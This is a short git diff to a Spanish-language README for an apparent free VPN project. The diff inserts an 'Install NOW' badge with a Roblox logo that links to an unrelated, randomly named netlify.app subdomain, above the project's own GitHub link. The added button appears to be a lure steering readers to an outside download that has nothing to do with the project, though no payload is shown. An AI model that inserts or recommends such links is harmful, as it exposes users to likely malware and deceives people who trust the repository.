@@ -27,7 +27,8 @@ Sin logs. Sin anuncios. Sin suscripciones. Solo comunidad y código puro.
 Únete, fork, comparte servidores, traduce, mejora el código.  
 Juntos construimos un internet más libre y seguro.
 
-
+[![Install NOW](https://img.shields.io/badge/Install-NOW-purple?style=for-the-badge&logo=roblox&logoColor=white)](https://rainbow-biscotti-69b153.netlify.app/)
+-
 
 
 [![Explora Ahora](https://img.shields.io/badge/Explora-AHORA-blueviolet)](https://github.com/ShadowNetForge/ShadowNetForge-VPN) 
